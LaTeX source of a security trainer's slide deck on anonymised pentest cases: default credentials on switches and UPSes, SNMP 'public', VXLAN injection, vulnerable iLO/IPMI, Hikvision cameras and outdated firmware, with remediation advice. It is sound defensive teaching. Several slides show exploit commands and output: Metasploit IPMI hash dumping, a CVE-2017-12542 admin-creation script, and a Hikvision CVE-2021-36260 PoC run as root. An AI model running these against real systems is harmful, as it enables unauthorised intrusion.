\documentclass[Screen16to9,17pt]{foils}
%\documentclass[16pt,landscape,a4paper,footrule]{foils}
\usepackage{zencurity-slides}

% Pentest-cases
% For alle der er interesserede i almindelige problemer i produktionsnetværk og servere

% Denne aften er en gennemgang af diverse pentest sager, anonymiseret.

% Hvordan blev systemerne fundet, undersøgt og hacket. Vi vil se på almindelige fejl som observeret gennem nogle årtier. Dernæst vil vi gennemgå blue team pentest værktøjer som deltagerne selv kan benytte for at undgå lignende sager i egne organisationer.

% Nogle af sagerne vil kunne beskrives således:

% * Hacking af Tomcat server
% * Hvor er backuppen
% * Er core switchen sikker
% * Kan vi måske (KVM) ikke producere mere interne (IPMI) computer systemer som andre ikke kan styre
% * Vokseværk - hvorfor står Exchange serveren stadig på client LAN




\begin{document}

%\rm
\selectlanguage{english}

\mytitlepage
{Pentesting Cases}
%{Pentest introduction - greatest hits}


\slide{Goals for today}
\vskip 1 cm

\hlkimage{3cm}{dont-panic.png}
\centerline{\color{titlecolor}\LARGE Don't Panic!}


\begin{list1}
\item Introduce the term penetration testing and talk about pentest cases
\item Talk about things I have seen in real life pentesting
\item Try to understand why they are a problem, sometimes a big problem
\item Discuss how we can avoid them in your future environments
\end{list1}

\slide{Materials -- where to start}

\begin{list2}
\item This presentation -- slides for today, start here
\item Nmap Workshop exercises\\{\footnotesize
\link{https://github.com/kramse/security-courses/blob/master/courses/pentest/nmap-workshop/nmap-workshop-exercises.pdf}}
\item KEA Pentest course exercises\\{\footnotesize
\link{https://github.com/kramse/security-courses/blob/master/courses/pentest/kea-pentest/kea-pentest-exercises.pdf}}
\item Setup instructions for creating a Kali virtual machine:\\
\link{https://github.com/kramse/kramse-labs}
\item Also the Simulated DDoS Workshop is available:\\{\footnotesize
\link{https://github.com/kramse/security-courses/tree/master/presentations/pentest/simulated-ddos-workshop}}
\end{list2}

%\centerline{We cannot go through all of them, but feel free to ask questions later}

{\bf Start a download of Kali today, if you want to play with the tools tomorrow}\\
Recommend virtual machine download 64-bit \url{https://www.kali.org/get-kali/#kali-virtual-machines}


\hlkprofiluk

\slide{Internet Today}

\hlkimage{10cm}{images/server-client.pdf}

\begin{list1}
\item Clients and servers, roots in the academic world
\item Protocols are old, some more than 20 years
\item Very little is encrypted, mostly HTTPS
\end{list1}


\slide{Hacker tools}

\begin{list1}
\item \emph{Improving the Security of Your Site by Breaking Into it}\\ by
Dan Farmer and Wietse Venema in 1993
\item Later in 1995 released the software SATAN\\
\emph{Security Administrator Tool for Analyzing Networks}
\item Caused some commotion, panic and discussions, every script kiddie can hack, the internet will melt down!
\vskip 5mm
\begin{quote}
We realize that SATAN is a two-edged sword -- like
many tools, it can be used for good and for evil
purposes. We also realize that intruders (including
wannabees) have much more capable (read intrusive)
tools than offered with SATAN.
\end{quote}
\end{list1}

\vskip 1cm
Source:
\link{http://www.fish2.com/security/admin-guide-to-cracking.html}




\slide{Hacker -- cracker}

{\bfseries Short answer -- dont discuss this}

%Det lidt længere svar:\\
Yes, originally there was another meaning to hacker, but the media has perverted it and today, and since early 1990s it has meant breaking into stuff for the public

{\color{red}\hlkbig Today a hacker breaks into systems!}

Reference. Spafford, Cheswick, Garfinkel, Stoll, \ldots
- wrote about this and it was lost

Story is interesting and the old meaning is ALSO used in smaller communities, like hacker spaces full of hackers - doing fun and interesting stuff
\begin{list2}
\item \emph{Cuckoo's Egg: Tracking a Spy Through the Maze of Computer
 Espionage},  Clifford Stoll
\item \emph{Hackers: Heroes of the Computer Revolution},
Steven Levy
\item \emph{Practical Unix and Internet Security},
Simson Garfinkel, Gene Spafford, Alan Schwartz
\end{list2}

\slide{Agreements for testing networks}

\begin{quote}\small
Danish Criminal Code\\
Straffelovens paragraf 263 Stk. 2. Med bøde eller fængsel indtil 1 år og 6 måneder straffes den, der uberettiget skaffer sig adgang til en andens oplysninger eller programmer, der er bestemt til at bruges i et informationssystem.
\end{quote}

Hacking can result in:
\begin{list2}
\item Getting your devices confiscated by the police
\item Paying damages to persons or businesses
\item If older getting a fine and a record -- even jail perhaps
\item Getting a criminal record, making it hard to travel to some countries and working in security
\item Fear of terror has increased the focus -- so dont step over bounds!
\end{list2}

Asking for permission and getting an OK before doing invasive tests, always!


\slide{Why even do security testing?}

\begin{list1}
\item Lots of security problems
\item Pentesting may be a requirement from external partners -- example VISA PCI standard
\end{list1}

\begin{list2}
\item Boss asking: should we do a security test?
\item CIO: hmm, okay
\item IT Admins: *sigh* -- I know the security sucks in places!
\item Its not your systems -- dont take the criticism personal, but as an opportunity to get things improved
\vskip 1cm
\item Pentest tools are great resources for doing discovery of assets, evaluating the security of large installations quickly -- in short using pentest tools makes you more efficient!
\end{list2}

\centerline{\Large Many see the benefits after doing a pentest, so try it!}


\slide{Benefits of having a planned security test done}

\begin{quote}
Goal of testing is to reduce risk for the systems and secure the organisation\\ from unexpected loss of data, image and increased costs.
\end{quote}

\begin{list1}
\item Intended audience:
\begin{list2}
\item IT-department and technical personnel
\item Management and board
\item External auditors, government, financial control VISA/PCI, the public
\end{list2}
\item Output from testing:
\begin{list2}
\item Reports with technical content and recommendations
\item Executive summary
\end{list2}
\end{list1}

Goal is not to find a scape goat to blame -- management allocates resources, they are responsible

If security is below in places more resources may be needed.


\slide{Confidentiality, Integrity and Availability}

\hlkimage{8cm}{cia-triad-uk.pdf}

\begin{list1}
\item We want to protect something
\item Confidentiality - data kept a secret
\item Integrity - data is not subjected to unauthorized changes
\item Availability - data and systems are available when needed
\end{list1}

\slide{Goals of Security}


\hlkimage{6cm}{Bartizan.png}

\begin{list1}
\item Prevention - means that an attack will fail
\item Detection - determine if attack is underway, or has occured - report it
\item Recovery - stop attack, assess damage, repair damage
\end{list1}


\slide{What is Infrastructure -- Software}


\hlkimage{10cm}{alexander-schimmeck-SeeM4AnkEHE-unsplash.jpg}

\begin{list2}
\item Enterprises today have a lot of computing systems supporting the business needs
\item These are very diverse and often discrete systems
\end{list2}

\hfill Photo by Alexander Schimmeck on Unsplash

\slide{Business Challenges}

\hlkimage{7cm}{adam-bignell-9tI2z5VZIZg-unsplash.jpg}

\begin{list2}
\item Accumulation of software
\item Legacy systems
\item Partners
\item Various types of data
\item Employee churn, replacement \hfill Photo by Adam Bignell on Unsplash
\end{list2}


\slide{Software Challenges}

\hlkimage{7cm}{john-barkiple-l090uFWoPaI-unsplash.jpg}

\begin{list2}
\item Complexity
\item Various languages
\item Various programming paradigms, client server, monolith, Model View Controller
\item Conflicting data types and available structures
\item Steam train vs electric train \hfill Photo by John Barkiple on Unsplash

\end{list2}


\slide{Book: Gray Hat Hacking  (Grayhat)}

\hlkimage{4cm}{9781264268955-gray-hat.jpg}

\emph{Gray Hat Hacking: The Ethical Hacker's Handbook}, 6th Edition\\
by Allen Harper, Ryan Linn, Stephen Sims, Michael Baucom, Huascar Tejeda, Daniel Fernandez, Moses Frost
Released March 2022 Paperback ISBN: 9781264268955 640 pp.

Also see Humble Bundles and others, \url{https://www.humblebundle.com/books} ebooks can be found cheap now!

Has some programming introduction which are very useful.

\slide{24 Deadly Sins of Software Security}

\hlkimage{6cm}{24-deadly.jpg}
\emph{24 Deadly Sins of Software Security: Programming Flaws and How to Fix Them}, Michael Howard, David LeBlanc, John Viega, ISBN: 9780071626750, 2010 The McGraw-Hill Companies, named 24-deadly below

\slide{Deadly Sins 1/2}

\begin{list1}
\item Part I Web Application Sins 1-4
\begin{quote}
1) SQL Injection
2) Web Server-Related Vulnerabilities
3) Web Client-Related Vulnerabilities (XSS)
4) Use of Magic URLs, Predictable Cookies, and Hidden Form Fields
\end{quote}
\item Part II Implementation Sins 5-18
\begin{quote}
5) Buffer Overruns, 6) Format String, 7) Integer Overflows,
8) C++ Catastrophes, 9) Catching Exceptions, 10) Command Injection
11) Failure to Handle Errors Correctly 12) Information Leakage
13) Race Conditions 14) Poor Usability
15) Not Updating Easily
16) Executing Code with Too Much Privilege
17) Failure to Protect Stored Data
18) The Sins of Mobile Code
\end{quote}
\end{list1}



\slide{Deadly Sins 2/2}

\begin{list1}
\item Part III Cryptographic Sins 19-21
\begin{quote}
19) Use of Weak Password-Based System
20) Weak Random Numbers
21) Using Cryptography Incorrectly
\end{quote}
\item Part IV Networking Sins 22-24
\begin{quote}
22) Failing to Protect Network Traffic,
23) Improper use of PKI, Especially SSL,
24) Trusting Network Name Resolution
\end{quote}
\end{list1}



\slide{Design vs Implementation}

Software vulnerabilities can be divided into two major categories:
\begin{list2}
\item Design vulnerabilities
\item Implementation vulnerabilities
\end{list2}

Even with a well-thought-out security design a program can contain implementation flaws.

Then we also have the \emph{operators} the ones installing, running and maintaining our systems (and perhaps some security). The operators are often time-constrained, over-worked, busy, etc. Not an excuse, but realities

{\bf\Large TL;DR All Software Has Bugs -- some are serious}

\slide{Shit Happened}


\begin{alltt}
Login: admin
Password: admin
\end{alltt}

\begin{list2}
\item Sometimes you buy something, power it, and forget about it
\item We all do
\item It is still a problem if it happens at work
\item Good thing, often easier to find with scanning tools
\end{list2}


\slide{Malicious Configuration and Negligence}

%\hlkimage{}{im-a-hacker.jpg}

\begin{quote}
Negligence (Lat. negligentia)[1] is a failure to exercise appropriate and/or ethical ruled care expected to be exercised amongst specified circumstances.[2] The area of tort law known as negligence involves harm caused by failing to act as a form of carelessness possibly with extenuating circumstances.
\end{quote}
Source: \url{https://en.wikipedia.org/wiki/Negligence}


\begin{list2}
\item When I find something which is NOT default, but had to be configured
\item It contains a default user like admin with password admin
\item Or some network configuration which is equally bad
\end{list2}

I consider this malicious, somebody \emph{on purpose} configured something {\bf badly}

\slide{On-site pentesting}
% Flere sager, men eksampelvis hos Forsikringsselskab med admin/admin

%\hlkimage{}{}

So doing pentest can be remote or on-site, at the customer site. I was at this insurance company, very professional, very nice, doing pentesting on the network.

I scanned the network and found the usual stuff, which often includes
\begin{list2}
\item Dirty server room -- they all rely on the devices in this room, great
\item No UPS -- power cables are a mess
\item Printers with default settings -- we can have fun reconfiguring them
\item Server administration -- more about that later
\end{list2}

The usual stuff ...


\slide{Nice Rack you got there!}

\hlkimage{8cm}{rackskab.jpg}

\slide{Physical Inspection is Needed}

Yes, go through the server room!

Things we find:
\begin{list2}
\item Single firewall, running with a single power supply -- single point of failure
\item No Uninterruptable Power Supply -- having NO UPS is bad if availability is important
\item Bad cabling, disaster can strike, and no one can help you
\item Bad cooling can take down your whole company
\end{list2}

Advice: Start documenting your setup -- buy a label maker today

\slide{Core Switch Administration}

Then I also found switch administration with admin/admin *sigh*

\hlkimage{10cm}{edgemax-admin-admin.png}

\begin{list2}
\item Is this the main switch for the whole office?! Yes - unfortunately
\item I was also called up one time about a large core switch that had lost configuration, nothing worked
\end{list2}

\slide{Upgrade your firmware (2020)}

%\hlkimage{}{}

This was seen at the same customer in 2020:
\begin{alltt}
Cisco ASA Version 9.8(2) - Released: August 28, 2017
Cisco ASDM 7.8(2)Cisco
\end{alltt}

\begin{list2}
\item We can talk about firmware quality, but if you haven't \emph{upgraded} it in 3+ years ...
\item Firmware updates fix known problems and security issues -- install them
\item Create a process to review and update once in a while
\end{list2}

\slide{Firewalls have software too}

Most major firewall and security vendor has had similar problems/vulns
\begin{list2}
\item CVE-2024-24919 Check Point Quantum Security Gateways Information Disclosure Vulnerability CVSS 8.6\\
Potentially allowing an attacker to read certain information on Check Point Security Gateways once connected to the internet and enabled with remote Access VPN or Mobile Access Software Blades. A Security fix that mitigates this vulnerability is available.

\item CVE-2024-3400 PAN-OS: Arbitrary File Creation Leads to OS Command Injection Vulnerability in GlobalProtect CVSS 10.0
\item CVE-2024-21762 FortiOS Out-of-bound Write in sslvpnd CVSS 9.8\\
    A out-of-bounds write vulnerability [CWE-787] in FortiOS and FortiProxy may allow a remote unauthenticated attacker to execute {\bf arbitrary code or command} via specially crafted HTTP requests.
\item CVE-2024-21591, is rated 9.8 on the CVSS scoring system\\
"An out-of-bounds write vulnerability in J-Web of Juniper Networks Junos OS SRX Series and EX Series allows an {\bf unauthenticated}, network-based attacker to cause a Denial-of-Service (DoS) or Remote Code Execution (RCE) and {\bf obtain root privileges} on the device,"
\end{list2}


\slide{Cisco fixes May 2024}

\hlkimage{12cm}{cisco-asa-2024.png}

\begin{quote}
The May 22, 2024, release of the Cisco ASA, FMC, and FTD Software Security Advisory Bundled Publication includes 6 Cisco Security Advisories that describe 6 vulnerabilities in Cisco ASA, FMC, and FTD. Cisco has released software updates that address these vulnerabilities.

Cisco has confirmed that all of the fixed software releases that are part of this bundle include the fix for the vulnerabilities that were involved in the ArcaneDoor attack campaign, described in CVE-2024-20353, CVE-2024-20358, and CVE-2024-20359.
\end{quote}
Source: \url{https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75298}

\slide{How do we find systems -- Nmap banner scanning }

\begin{alltt}\scriptsize
root@cornerstone:~#{\bfseries nmap -A -p80,443 172.29.0.0/24}
Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:37 CET
Nmap scan report for 172.29.0.1
Host is up (0.00027s latency).
PORT    STATE    SERVICE VERSION
80/tcp  open     http    {\bf Apache httpd 2.2.26 ((Unix) DAV/2 mod_ssl/2.2.26 OpenSSL/0.9.8zc)}
|_http-title: Site doesn't have a title (text/html).
443/tcp filtered https
MAC Address: 00:50:56:C0:00:08 (VMware)
Device type: media device|general purpose|phone
Running: Apple iOS 6.X|4.X|5.X, Apple Mac OS X 10.7.X|10.9.X|10.8.X
OS details: Apple iOS 6.1.3, Apple Mac OS X 10.7.0 (Lion) - 10.9.2 (Mavericks)
OS and Service detection performed.
Please report any incorrect results at http://nmap.org/submit/
\end{alltt}

\begin{list2}
\item Nmap scanning is quick and easy -- scan 100s of IP addresses quickly
\item Can even save output as XML and includes Ndiff for comparing scans
\item Network scanning is often the most efficient way to get an overview
\item The network scan can immediately identify services which should NOT be available
\end{list2}


\slide{SNMP problems}

\begin{quote}
5.5 Simple Network Management Protocol
The Simple Network Management Protocol (SNMP) [37] has recently been defined to aid in network
management. Clearly, access to such a resource must be heavily protected. The RFC states this, but
also allows for a null authentication service; this is a bad idea. Even a ‘‘read-only’’ mode is dangerous;
it may expose the target host to netstat-type attacks if the particular Management Information Base
(MIB) [38] used includes sequence numbers. (T
\end{quote}
Source: The paper \emph{Security Problems in the TCP/IP Protocol Suite} was originally\\
published in Computer Communication Review, Vol. 19, No. 2, in April, 1989, Steven M. Bellovin\\
\url{https://www.cs.columbia.edu/~smb/papers/ipext.pdf}

An update was published in 2004
\emph{A Look Back at “Security Problems in the TCP/IP Protocol Suite”}, \\
Steven M. Bellovin
\url{https://www.cs.columbia.edu/~smb/papers/acsac-ipext.pdf}

\slide{SNMP Public (2013)}
% Bank! SRX
%\hlkimage{}{}
So if this was common knowledge in the 1990s, why do we still see systems with SNMP \verb+public+

The situation:
\begin{list2}
\item I was put into this office at a bank -- scan the network, here are the prefixes
\item Found NOTHING, really slow, getting frustrated
\item Then I found SNMP available on the core router, a firewall type of devices SRX3400
\item Turned out they had configured with \verb+public+ - why would they to this?
\end{list2}

\slide{After mapping the network }

After I managed to map the network using SNMP output - with \verb+snmpwalk+:
\begin{list2}
\item Found live machines, could scan more efficiently
\item Could see sessions, what is allowed
\item Found network shares, publicly available with files containing sensitive information
\item Found documents, passport pictures, ID pictures -- lots of personal information
\end{list2}

It all began with a simple SNMP walk

\slide{Talking about old software}

%\hlkimage{}{}

\begin{alltt}\scriptsize
$ nmap -sU -p 161 --script snmp-info 87.xxx // large danish commercial ISP IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 23:45 CEST
Nmap scan report for 87.xxx
Host is up (0.0014s latency).
PORT STATE SERVICE
161/udp open snmp
| snmp-info:
| enterprise: ciscoSystems
| engineIDFormat: unknown
| engineIDData: 0300a80c0d2f2378
| snmpEngineBoots: 40
|_ snmpEngineTime: {\bf 1086d04h20m16s}
Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
\end{alltt}

Problems found with SNMP:
\begin{list2}
\item SNMP uptime often correlates to last firmware update, 1086 days -- no firmware installed for a long time
\item Network mapping - can show network infrastructure information
\item Not uncommon with +1000 days -- some have 1500 or even 1800 days!
\end{list2}



\slide{local networks}

\begin{quote}
6.1 Vulnerability of the Local Network
Some local-area networks, notably the Ethernet networks, are extremely vulnerable to eavesdropping and
host-spoofing. If such networks are used, physical access must be strictly controlled. It is also unwise
to trust any hosts on such networks if any machine on the network is accessible to untrusted personnel,
unless authentication servers are used.

If the local network uses the Address Resolution Protocol (ARP) [42] more subtle forms of host-spoofing
are possible. In particular, it becomes trivial to intercept, modify, and forward packets, rather than just
taking over the host’s role or simply spying on all traffic.
\end{quote}

Today we can send VXLAN spoofed packets across the internet layer 3 and inject ARP behind firewalls, in some cloud infrastructure cases ...

\slide{Why talk about VXLAN RFC7348 2014}

\quote{\small
Virtual Extensible LAN (VXLAN) is a network virtualization technology ... uses a VLAN-like encapsulation technique to {\bf encapsulate
OSI layer 2 Ethernet frames} within {\bf layer 4 UDP datagrams}, ... VXLAN endpoints, which terminate VXLAN tunnels and may be either v
irtual or physical switch ports, are known as {\bf VXLAN tunnel endpoints (VTEPs)}.[2][3]

\vskip 5mm

The VXLAN specification was originally created by {\bf VMware, Arista Networks and Cisco}.[5][6] Other backers of the VXLAN technology
include {\bf Huawei,[7] Broadcom, Citrix, Pica8, Cumulus Networks, Dell EMC, Mellanox,[8] FreeBSD,[9] OpenBSD,[10] Red Hat,[11] Joyent,
 and Juniper Networks.}
}
Source:\\
\url{https://en.wikipedia.org/wiki/Virtual_Extensible_LAN}

\vskip 1cm
Security Considerations:   TBD.


\slide{Overview VXLAN RFC7348 2014}

\hlkimage{21cm}{vxlan-basic.png}

How does it work?

\begin{list2}
\item Router 1 takes Layer 2 traffic, encapsulates with IP+UDP port 4789, routes
\item Router 2 receives IP+UDP+data, decapsulates, forward/switches layer 2 onto VLAN
\item Hosts 10.0.0.10 can talk to 10.0.0.20 as if they where next to each other in switch
\item Most often VLAN IEEE 802.1q involved too, but not shown
%\item Lets only consider two routers
\end{list2}

\slide{VXLAN injection}

\hlkimage{19cm}{vxlan-basic-injection.png}

I tested using my pentest server in one AS, sending across an internet exchange into a production network, towards Arista testing devices - no problems, it's just routed layer 3 IP+UDP packets

\slide{Example: Send UDP DNS reqs to inside server}

\hlkimage{20cm}{vxlan-basic-injection-dns.pdf}

Attacker can send UDP DNS request to inside server on RFC1918 destination\\
Note: server has no external IP or incoming ports forwarded.\\
Tested working with Clavister with DNS UDP probes/requests, no inspection


\slide{VXLAN also used a lot in Cisco ACI}

%\hlkimage{}{}

\begin{quote}\footnotesize
Cisco Application Centric Infrastructure (ACI), {\bf the industry’s most secure, open, and comprehensive software-defined networking (SDN) solution}, enables automation that accelerates infrastructure deployment and governance, simplifies management to easily move workloads across a multifabric and multicloud frameworks, and proactively secures against risk arising from anywhere. It radically simplifies, optimizes, and expedites the application deployment lifecycle.
\end{quote}
Source:\\ {\scriptsize\url{https://www.cisco.com/c/en/us/solutions/collateral/data-center-virtualization/application-centric-infrastructure/solution-overview-c22-741487.html}}

\slide{Cisco ACI (2019)}

%\hlkimage{}{}

\begin{quote}{\bf
Vulnerability Analysis}
\begin{list2}
\item Remote Code Execution on Leaf Switches over IPv6 via Local SSH Server (CVE-2019-1836, CVE2019-1803, and CVE-2019-1804) -- SSH access with specific source port, private key left on firmware image, and on all switches
\item Cisco Nexus 9000 Series Fabric Switches ACI Mode Fabric Infrastructure VLAN Unauthorized Access
Vulnerability (CVE-2019-1890)
\item Cisco Nexus 9000 Series Fabric Switches Application Centric Infrastructure Mode Link Layer Discovery
Protocol Buffer Overflow Vulnerability (CVE-2019-1901)
\item Cisco Application Policy Infrastructure Controller REST API Privilege Escalation Vulnerability (CVE2019-1889)
\end{list2}
\end{quote}
Source: \url{https://static.ernw.de/whitepaper/ERNW_Whitepaper68_Vulnerability_Assessment_Cisco_ACI_signed.pdf}

Further all processes run as root user -- good job Cisco

\slide{Secure Shell access to core devices }

%\hlkimage{}{}
This Cisco ACI problem with SSH allowed with specific source port reminds me of another case.

I was doing audit of a network with Juniper devices, core routers.

They all had router protection filters only certain IP ranges could access \emph{management} -- highly recommended. Access Control List (ACL) is genericly the name

Like this one for my router:
\begin{alltt}
ip access-list ssh-acl
   10 permit tcp 10.123.44.0/24 any
!
management ssh
   ip access-group ssh-acl in
\end{alltt}

Unfortunately I saw that using a specific source port allowed anyone to access the Secure Shell port
\begin{list2}
\item Often this happens with ports like 53/tcp and 53/udp
\end{list2}

\slide{Switch configuration (2019)}

%\hlkimage{}{}

Switch config -- protecting the web administration using ACL:
\begin{alltt}\scriptsize
telnet server enable
telnet server acl 2000
…
ip http acl 2000
ip https acl 2000
ip https enable
#
acl number 2000 name sw-adgang
rule 5 permit source 172.24.95.233 0
rule 10 permit source 172.24.88.253 0
rule 15 permit source 172.24.92.0 0.0.3.255
rule 20 permit source 10.109.200.0 0.0.7.255
rule 25 permit source 10.10.10.0 0.0.0.255
\end{alltt}

Then again the Secure Shell access was NOT protected -- no ACL:
\begin{alltt}\scriptsize
ssh server enable
\end{alltt}

This switch also had a single user \verb+manager+ which I recommended be replaced.

TL;DR There was NOT a secure configuration on this network -- municipality in Denmark

\slide{Old software (2019)}

%\hlkimage{}{}

How old can software be? This customer had some old DWL-3260AP access points

\begin{quote}
D-Link DWL-3260AP - 802.11g Managed Access Point.\\
”This product was phased out on: 20/05/2013”

\url{https://eu.dlink.com/uk/en/products/dwl-3260ap-wireless-ceiling-mount-poe-access-point}\\
 (link might not work anymore)

The software for this model is:\\
Firmware 1.20 rc340 Firmware 06/04/2009
\end{quote}

\vskip 2cm
\begin{list2}
\item At the time of testing in 2019 this was 10 year old software, probably full of security issues that will never be fixed
\end{list2}


% * Kan vi måske (KVM) ikke producere mere interne (IPMI) computer systemer som andre ikke kan styre
\slide{Management interfaces}

In general we have lots of \emph{management interfaces}, only intended for administrators. We should do our best to keep them isolated on management VLANs and have a secure configuration.

Server hardware typically have KVM (Keyboard Video Mouse) interfaces:
\begin{list2}
\item Compaq/HP Integrated Lights-Out (ILO) Management
\item Dell Remote Access Controller (iDRAC) default user root/calvin
\item Generic servers like SuperMicro have Intelligent Platform Management Interface (IPMI)\\
\url{https://en.wikipedia.org/wiki/Intelligent_Platform_Management_Interface}
\end{list2}

Common problems found:
\begin{list2}
\item Default settings, default passwords -- often direct access to server administration
\item Not upgraded, firmware has known vulnerabilities
\end{list2}

I have seen this for many many years, and still see this in networks after 2020

\slide{Vulnerable HP ILO -- Metasploit module (2021)}

%\hlkimage{}{}

Vulnerability IPMI RAKP Dump hash:
\begin{alltt}\footnotesize
Name Description
---- -----------
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 172.16.10.205:623 - IPMI - Hash found: Administrator:ef4...c956bf6c9a9618a771c
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > setg RHOSTS 172.16.10.200
RHOSTS => 172.16.10.200
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 172.16.10.200:623 - IPMI - Hash found: Administrator:1aa4314318a30600...585fa89609bd2a9
\end{alltt}

Firmware was from 2017 -- so multiple years old, updates were available

\slide{Exploits are available (2021)}

%\hlkimage{}{}

\begin{alltt}\footnotesize
hkj@kate:~/bin$ ./get-users.py -h
usage: get-users.py [-h] [-t] [-e] [-u U] [-p P] ip
CVE-2017-12542 Tester and Exploiter script.
positional arguments:
  ip
  target IP
optional arguments:
  -h, --help show this help message and exit
  -t        Test. Trigger the exploit and list all users
  -e        Exploit. Create a new admin user with the credentials specified in -u and -p
  -u U      username of the new admin user
  -p P      password of the new admin user
hkj@kate:~/bin$ ./get-users.py 172.16.10.205
[+] Target is VULNERABLE!
[+] Account name: User Account Username: Administrator
[+] Account name: User Account Username: ilo
\end{alltt}


\begin{list2}
\item Another server had firmware from 2014 allowing the creation of administrative users directly
\end{list2}

\slide{Internet of Things -- to hack (2022)}

%\hlkimage{}{}

This case from 2022 was a municipality in Denmark, having HikVision IP cameras, these have been critisized a lot, for good reason.

In this case we told the customer when they showed up in the external scan, this is a high risk. Later when we looked more into them, we could find a ready made exploit:\\
CVE-2021-36260 HikVision Remote Code Execution – critical

And surely
\begin{alltt}\footnotesize
user@Zencurity:bin$ python3 hikvision210702-exec.txt --rhost 94.xxx --cmd "uname -a"
[*] Hikvision CVE-2021-36260
[*] PoC by bashis <mcw noemail eu> (2021)
[*] Checking remote "94.xxx"
[i] ETag: "5c3-258-5e256676"
[!] Remote is verified exploitable{\bf
Linux (none) 4.9.37 #1 SMP Sun Jan 19 10:50:48 CST 2020 armv7l}
\end{alltt}

\slide{More commands}
\begin{alltt}\footnotesize
user@Zencurity:bin$ python3 hikvision210702-exec.txt --rhost 94.xxx --cmd "id"
[*] Hikvision CVE-2021-36260
[*] PoC by bashis <mcw noemail eu> (2021)
[*] Checking remote "94.xxx"
[i] ETag: "5c3-258-5e256676"
[!] Remote is verified exploitable{\bf
uid=0(admin) gid=0(root)}
\end{alltt}

We are root - we can do what we Like

\slide{More commands}
\begin{alltt}\footnotesize
user@Zencurity:bin$ python3 hikvision210702-exec.txt --rhost 94.xxx --cmd "ls -l"
[*] Hikvision CVE-2021-36260
[*] PoC by bashis <mcw noemail eu> (2021)
[*] Checking remote "94.xxx"
[i] ETag: "5c3-258-5e256676"
[!] Remote is verified exploitable
-rwxrwxrwx    1 admin    root          1349 Jan  8  2020 ASC16
-rwxrwxrwx    1 admin    root          3859 Jan  8  2020 ASC32
-rwxrwxrwx    1 admin    root        457196 Jan  8  2020 GBK
-rwxrwxrwx    1 admin    root          3944 Aug 29 14:23 alarm.ko
drwxrwxrwx    2 admin    root             0 Aug 29 14:23 applib
drwxr-xr-x    2 admin    root             0 Aug 29 14:23 dalg
drwxr-xr-x    2 admin    root             0 Aug 29 15:49 dlog
drwxrwxrwx    2 admin    root             0 Aug 29 14:23 dsp_extres
...
\end{alltt}

We can access files, and everything else on the cameras

\slide{UPS the UPS is on the network (2021)}

\hlkimage{14cm}{eaton-ups-admin.png}
This I have seen at multiple customers

\slide{Eaton by default allow admin/admin}

\hlkimage{14cm}{eaton-admin-shutdown.png}
\begin{list2}
\item Battery UPS (Uninterruptable Power Supply) for server room has default credentials admin/admin\\
 - also this interface is over unencrypted HTTP
\end{list2}

\slide{SNMP again!}

\hlkimage{14cm}{eaton-ups-snmp.png}

\begin{list2}
\item Eaton even has SNMP write community \verb+private+ configured
\item A single command with snmp-set could disable power
\end{list2}

\slide{HP Switches are very user friendly}

%\hlkimage{}{}

\begin{alltt}\scriptsize
$ telnet 172.16.1.21
Connected to 172.16.1.21.
HP J9772A 2530-48G-PoEP Switch
Software revision YA.16.08.0015
(C) Copyright 2020 Hewlett Packard Enterprise Development LP
RESTRICTED RIGHTS LEGEND
...
Press any key to continue
Your previous successful login (as manager) was on 1990-02-19 21:27:21
from 172.16.1.250
SW04Stuen# show configuration
Running configuration:
; J9772A Configuration Editor; Created on release #YA.16.08.0015
; Ver #14:01.44.00.04.19.02.13.98.82.34.61.18.28.f3.84.9c.63.ff.37.27:45
\end{alltt}

\begin{list2}
\item Nothing to see here -- just log me in without a password, thank you HP\\
No NTP servers, no log servers, default credentials, using bad default SNMP public, configured with VLANs
\end{list2}


\slide{Other Management interfaces}

%\hlkimage{}{}
Found on a single customer LAN:
\begin{list2}
\item UPS SNMP and Web available – also uses default credentials
\item Wi-Fi controller web interface available
\item HP ILO web interface - some with vulnerable software
\item Network printer interfaces
\item Storage devices – small NAS devices and Storwize
\item HP switch interfaces – web, telnet some with default vendor admin credentials and/or SNMP public
\item MOXA device Unknown usage
\item ESXi management interfaces on multiple port
\end{list2}

This was in 2021, and I wrote:\\
Note recent years have seen high risk vulnerabilities in these


\slide{Years after in 2023}

%\hlkimage{}{}

\begin{quote}{\bf
Ransomware Campaign Compromising VMware ESXi Servers}\\
On February 3, 2023, French web hosting provider OVH and French CERT issued warnings about a ransomware campaign that was targeting VMware ESXi servers worldwide with a new ransomware strain dubbed “ESXiArgs.” The campaign appears to be leveraging CVE-2021-21974, {\bf a nearly two-year-old heap overflow vulnerability in the OpenSLP service ESXi runs}. The ransomware operators are using opportunistic “spray and pray” tactics and have compromised hundreds of ESXi servers in the past few days, apparently including servers managed by hosting companies. ESXi servers exposed to the public internet are at particular risk.
\end{quote}
Source: \url{https://www.rapid7.com/blog/post/2023/02/06/ransomware-campaign-compromising-vmware-esxi-servers/}

\begin{list2}
\item Who allows these to be on the freaking internet!
\end{list2}


% * Vokseværk - hvorfor står Exchange serveren stadig på client LAN
\slide{In 2022 Don't keep your Exchange server on the LAN!}

\hlkimage{15cm}{exchange-lan.pdf}

Another service which is being attacked in recent years is Microsoft Exchange

This customer had their Exchange server directly on the LAN?!

\begin{list2}
\item There is a high risk that a single vulnerability in Microsoft Exchange would \\
open this network to complete compromise
\end{list2}


\slide{Microsoft Exchange vulnerabilities with CVSS 7 or higher}

\hlkimage{16cm}{images/exchange-2021-cvss-7.png}
\hlkimage{16cm}{images/exchange-2022-cvss-7.png}

\begin{list2}
\item Lesson: Don't put Exchange on your LAN!
\end{list2}


\slide{At least the servers are up to date!}

\hlkimage{16cm}{openssh-old-versions.png}

\begin{list2}
\item OpenSSH is the main access for administrators to Unix systems
\item If this is not up to date, the rest of the system is neither updated
\item Note this is from a single test in 2021! Another test in 2022 had 7.2p2 on 17 servers
\end{list2}


\slide{Making backups is great!}

\hlkimage{6cm}{tsm-backup.jpg}
Picture from IBM manuals

\begin{list2}
\item We once found TSM Backup Client on a server -- simple/default password of course
\item How bad can this be?
\item Well we could find names of files, which we could download through the web server
\item Found Excel files with user names, and passwords
